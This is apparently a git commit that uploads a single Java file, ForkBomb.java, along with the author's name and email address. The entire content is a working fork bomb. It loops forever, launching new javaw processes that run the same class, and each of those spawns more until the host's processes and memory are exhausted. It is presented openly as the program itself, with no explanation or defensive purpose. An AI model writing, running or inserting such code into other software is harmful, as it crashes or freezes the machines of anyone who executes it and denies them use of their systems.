5b46c920cc3ec5133e03d2d5f97ab2baa4052d9a
Helithumper <peyton.duncan45@gmail.com>
2015-03-06 16:38:05 -0500

    Initial File Upload

---
+++ src/ForkBomb.java
@@ -0,0 +1,12 @@
+import java.io.IOException;
+
+public class ForkBomb
+{
+  public static void main(String[] args) throws IOException 
+  {
+    while(true)
+    {
+      Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+    }
+  }
+}
